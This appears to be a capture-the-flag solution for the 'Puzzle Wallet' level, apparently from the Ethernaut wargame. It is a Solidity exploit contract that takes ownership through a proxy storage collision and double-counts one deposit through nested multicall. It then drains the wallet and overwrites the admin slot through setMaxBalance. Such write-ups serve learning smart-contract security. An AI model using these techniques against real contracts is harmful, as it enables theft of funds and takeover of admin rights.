Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PuzzleWallet  {
    function setMaxBalance(uint) external; 
    function addToWhitelist(address) external;
    function proposeNewAdmin(address) external;
    function execute(address, uint256, bytes calldata) external payable ;
    function multicall(bytes[] calldata) external payable;
    function deposit() external payable;
}

contract Exploit {
    function exploit (PuzzleWallet _who) public {
        //become owner
        _who.proposeNewAdmin(address(this));
        //add this and player to whitelist
        _who.addToWhitelist(address(this));

        //drain funds
        bytes[] memory inside = new bytes[](1);
        inside[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        
        bytes[] memory outside = new bytes[](2);
        outside[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        outside[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, inside);

        _who.multicall{value: 0.001 ether}(outside);
        _who.execute(msg.sender, 0.002 ether, "");
        //set maxBalance(admin) to player
        _who.setMaxBalance(uint256(uint160(msg.sender)));

    }

    receive() external payable {}
}
```
Call exploit() sending your contract instance
